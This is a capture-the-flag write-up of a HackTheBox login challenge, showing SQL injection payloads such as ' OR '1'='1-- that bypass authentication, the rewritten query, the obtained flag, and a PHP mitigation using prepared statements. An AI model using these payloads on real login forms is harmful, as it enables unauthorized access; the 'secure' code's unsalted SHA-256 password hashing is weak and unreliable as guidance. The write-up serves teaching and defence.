# SQL Injection Basic - Login Bypass

## Challenge Information
- **Platform**: HackTheBox
- **Event**: HackTheBoo 2024
- **Difficulty**: Easy
- **Category**: Web Security
- **Points**: 100

## Description
This challenge presents a web application with a login form vulnerable to SQL injection. The goal is to bypass authentication and gain access as administrator.

## Reconnaissance

### Initial Analysis
When accessing the application, we find a standard login form with username and password fields.

```
URL: http://target.com/login.php
Fields: username, password
```

### Basic Tests
I tried common credentials without success:
- admin:admin
- admin:password
- root:root

## Vulnerability Identification

### SQL Injection Detection
I tested basic payloads in the username field:

```sql
' OR '1'='1
' OR 1=1--
admin'--
```

With the payload `' OR '1'='1--` in the username field, I managed to bypass authentication.

### Query Analysis
The vulnerable SQL query is probably:

```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

By injecting `' OR '1'='1--`, the query becomes:

```sql
SELECT * FROM users WHERE username='' OR '1'='1'-- AND password=''
```

## Exploitation

### Successful Payload
```
Username: ' OR '1'='1--
Password: [anything]
```

### Result
Successful access as administrator, obtaining the flag: `HTB{5ql_1nj3c710n_15_345y}`

## Lessons Learned

1. **Always sanitize input**: The application did not properly validate or escape input data.

2. **Use prepared statements**: Parameterized queries prevent this type of attack.

3. **Principle of least privilege**: The database should not allow unauthorized operations.

## Mitigation

### Vulnerable Code
```php
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

### Secure Code
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, hash('sha256', $password)]);
```

## References
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

---
*Writeup completed on 2024-12-15*